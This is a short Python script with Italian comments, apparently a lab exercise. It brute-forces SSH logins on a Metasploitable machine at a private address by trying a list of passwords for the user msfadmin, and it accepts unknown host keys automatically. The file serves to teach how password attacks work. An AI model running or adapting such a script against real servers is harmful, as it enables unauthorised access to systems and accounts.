# Questo programma tenta di accedere ad un server SSH (Metasploitable, 192.168.50.101)
# usando un username noto (msfadmin) e una lista di password.
# Per ogni password, prova la connessione SSH e stampa se l'autenticazione
# ha avuto successo o no. In caso negativo il programma continua a provare.


import paramiko # Libreria che permetti di aprire connessione SSH in Python



def test_authentication(username, hostname, password): # definisce una funzione (test_authentication) che prova a fare il login
                                                       # con le credenziali date 

    client = paramiko.SSHClient() # nuovo oggetto client SSH (nuova sessione SSH)

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # imposta le policy delle chiavi dell'host
                                                                 # se il server è conosciuto, viene accettato automaticamente

    try:          # prova a connettersi al server SSh usando hostname, username e password
        client.connect(hostname, username=username, password=password) 

        print(f"Authentication successful: {username}:{password}") # Se la connessione riesce, mostra un messaggio di successo
                                                                   # con username e password

        return True # indica che l'autenticazione è riuscita
    
    except paramiko.AuthenticationException: # errore specifico di autenticazione, viene eseguito se il "try" genera un errora

        print(f"Authentication failed: {username}:{password}") # messaggio per l'utente di autenticazione fallita 
                                                               # mostra il nome utente e la password errati

        return False # indica che l'autenticazione non è riuscita
    
    finally:           # usato nella gestione delle eccezioni, serve a eseguire sempre il codice che ha dentro
        client.close() # chiude la connessione SSH per liberare risorse di sistema
                       # sia che il login sia avvenuto o meno
                       


passwords = ["emy", "msfadmin", "morty", "ninjaturtles", "vingardiumleviosa", "chocolatemuffin", "rivendell", "cthulhu"] # variabile che contiene una lista di possibili password

for p in passwords: # loop che prende ogni elemento dalla lista e controlla se è la pasword corretta

    if test_authentication("msfadmin", "192.168.50.101", p): #se l'auteticazione ha avuto successo, esce dal loop

        break # interrompe il ciclo e il programma termina